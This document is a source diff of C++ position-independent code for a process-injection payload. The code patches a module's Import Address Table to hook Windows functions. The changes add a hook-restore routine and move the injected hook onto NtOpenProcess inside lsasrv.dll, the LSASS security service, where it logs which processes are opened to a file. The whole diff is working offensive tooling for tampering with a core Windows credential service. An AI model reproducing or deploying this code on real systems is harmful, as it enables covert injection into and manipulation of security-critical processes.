@@ -88,7 +88,7 @@ HMODULE GetProcAddressWithHash(_In_ DWORD dwModuleFunctionHash)
 
 
 template <typename T>
-FORCEINLINE uintptr_t installHook(char* dllName, char*fctName, T b)
+FORCEINLINE uintptr_t installHook(char* targetModule, char*fctName, T b)
 {
 	INITPIC(-1);
 	sText(szKernel32Dll, "kernel32.dll");
@@ -96,9 +96,15 @@ FORCEINLINE uintptr_t installHook(char* dllName, char*fctName, T b)
 	PIC(szKernel32Dll, VirtualProtect);
 	PIC(szKernel32Dll, GetModuleHandleA);
 	_PIC(szMsvrtDll, strcmp);
+	_PIC(szMsvrtDll, printf);
 	
-	
-	auto module = fGetModuleHandleA(0);
+	HMODULE module;
+	if (!targetModule)
+		module = fGetModuleHandleA(0);
+	else
+		module = fGetModuleHandleA(targetModule);
+
+	_printf(_("Module %p\n"), module);
 	void** IATAddr = 0;
 	PIMAGE_DOS_HEADER img_dos_headers = (PIMAGE_DOS_HEADER)module;
 	PIMAGE_NT_HEADERS img_nt_headers = (PIMAGE_NT_HEADERS)((byte*)img_dos_headers + img_dos_headers->e_lfanew);
@@ -109,8 +115,11 @@ FORCEINLINE uintptr_t installHook(char* dllName, char*fctName, T b)
 			char* mod_func_name = (char*)(*(func_idx + (uintptr_t*)(iid->OriginalFirstThunk + (uintptr_t)module)) + (uintptr_t)module + 2);
 			intptr_t nmod_func_name = (intptr_t)mod_func_name;
 			if (nmod_func_name >= 0) {
-				if (!_strcmp(fctName, mod_func_name))
+				
+				if (!_strcmp(fctName, mod_func_name)) {
 					IATAddr = func_idx + (void**)(iid->FirstThunk + (uintptr_t)module);
+					//_printf(_("Imported module for %s : %s\n"), targetModule, mod_func_name);
+				}
 			}
 		}
 	}
@@ -129,36 +138,85 @@ FORCEINLINE uintptr_t installHook(char* dllName, char*fctName, T b)
 }
 
 
+FORCEINLINE uintptr_t restoreHook(char* targetModule, char*fctName, void* origPointer)
+{
+	INITPIC(-1);
+	sText(szKernel32Dll, "kernel32.dll");
+	sText(szMsvrtDll, "msvcrt.dll");
+	PIC(szKernel32Dll, VirtualProtect);
+	PIC(szKernel32Dll, GetModuleHandleA);
+	_PIC(szMsvrtDll, strcmp);
+	_PIC(szMsvrtDll, printf);
+
+	HMODULE module;
+	if (!targetModule)
+		module = fGetModuleHandleA(0);
+	else
+		module = fGetModuleHandleA(targetModule);
+
+	_printf(_("Module %p\n"), module);
+	void** IATAddr = 0;
+	PIMAGE_DOS_HEADER img_dos_headers = (PIMAGE_DOS_HEADER)module;
+	PIMAGE_NT_HEADERS img_nt_headers = (PIMAGE_NT_HEADERS)((byte*)img_dos_headers + img_dos_headers->e_lfanew);
+	PIMAGE_IMPORT_DESCRIPTOR img_import_desc = (PIMAGE_IMPORT_DESCRIPTOR)((byte*)img_dos_headers + img_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
+
+	for (IMAGE_IMPORT_DESCRIPTOR *iid = img_import_desc; iid->Name != 0; iid++) {
+		for (int func_idx = 0; *(func_idx + (void**)(iid->FirstThunk + (uintptr_t)module)) != nullptr; func_idx++) {
+			char* mod_func_name = (char*)(*(func_idx + (uintptr_t*)(iid->OriginalFirstThunk + (uintptr_t)module)) + (uintptr_t)module + 2);
+			intptr_t nmod_func_name = (intptr_t)mod_func_name;
+			if (nmod_func_name >= 0) {
+
+				if (!_strcmp(fctName, mod_func_name)) {
+					IATAddr = func_idx + (void**)(iid->FirstThunk + (uintptr_t)module);
+				}
+			}
+		}
+	}
+
+	if (IATAddr) {
+		DWORD oldProtect = 0;
+		fVirtualProtect(IATAddr, sizeof(uintptr_t), PAGE_READWRITE, &oldProtect);
+		*IATAddr = origPointer;
+		fVirtualProtect(IATAddr, sizeof(uintptr_t), oldProtect, &oldProtect);
+		return 1;
+	}
+	else
+		return 0;
+
+}
+
+typedef struct _CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } CLIENT_ID, *PCLIENT_ID;
+NTSTATUS NTAPI NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);
+
+
 
  void __stdcall RemoteFunction() {
 
 	INITPIC();
-	sText(szKernel32Dll, "kernel32.dll");
+	sText(szNtdllDll, "ntdll.dll");
+	sText(szLsasrvDll, "lsasrv.dll");
+	//sText(szLsasrvDll, "api-ms-win-core-synch-l1-1-0.dll");
 
-	HOOK(szKernel32Dll, 
-		ReadProcessMemory,[](HANDLE a, LPCVOID b, LPVOID c, SIZE_T d, SIZE_T* e) -> BOOL
+	HOOKTARGET(szLsasrvDll, 
+		NtOpenProcess, [](PHANDLE a, ACCESS_MASK b, POBJECT_ATTRIBUTES c, PCLIENT_ID d) -> NTSTATUS 
 		{
 			INITPIC(false);
-			sText(szKernel32Dll, "kernel32.dll");
-			sText(szMsvrtDll, "msvcrt.dll");
-			_PIC(szMsvrtDll, printf);
-			PIC(szKernel32Dll, ReadProcessMemory);
-			_printf(_("Hooked RPM %08x, %p, %p, %d, %p\n"),  a, b, c, d, e);
-			return fReadProcessMemory(a,b,c,d,e);
-		}
-	);
+			sText(szNtdllDll, "ntdll.dll");
+			PIC(szNtdllDll, NtOpenProcess);
+			//restoreHook(_("lsasrv.dll"), szNtOpenProcess, fNtOpenProcess);
+			//restoreHook(_("api-ms-win-core-synch-l1-1-0.dll"), szNtOpenProcess, fNtOpenProcess);
+			auto result = fNtOpenProcess(a, b, c, d);
 
-
-    HOOK(szKernel32Dll,
-		WriteProcessMemory, [](HANDLE a, LPVOID b, LPCVOID c, SIZE_T d, SIZE_T* e) -> BOOL
-		{
-			INITPIC(false);
-			sText(szKernel32Dll, "kernel32.dll");
 			sText(szMsvrtDll, "msvcrt.dll");
-			_PIC(szMsvrtDll, printf);
-			PIC(szKernel32Dll, WriteProcessMemory);
-			_printf(_("Hooked WPM  %08x, %p, %p, %d, %p\n"), a, b, c, d, e);
-			return fWriteProcessMemory(a,b,c,d,e);
+			_PIC(szMsvrtDll, fopen);
+			_PIC(szMsvrtDll, fprintf);
+			_PIC(szMsvrtDll, fclose);
+
+			FILE*f = _fopen(_("C:\\nc\\debug.log"), _("ab+"));
+			_fprintf(f, _("0x%08x access for %d\r\n"), b, d->UniqueProcess);
+			_fclose(f);
+
+			return result;
 		}
 	);
 
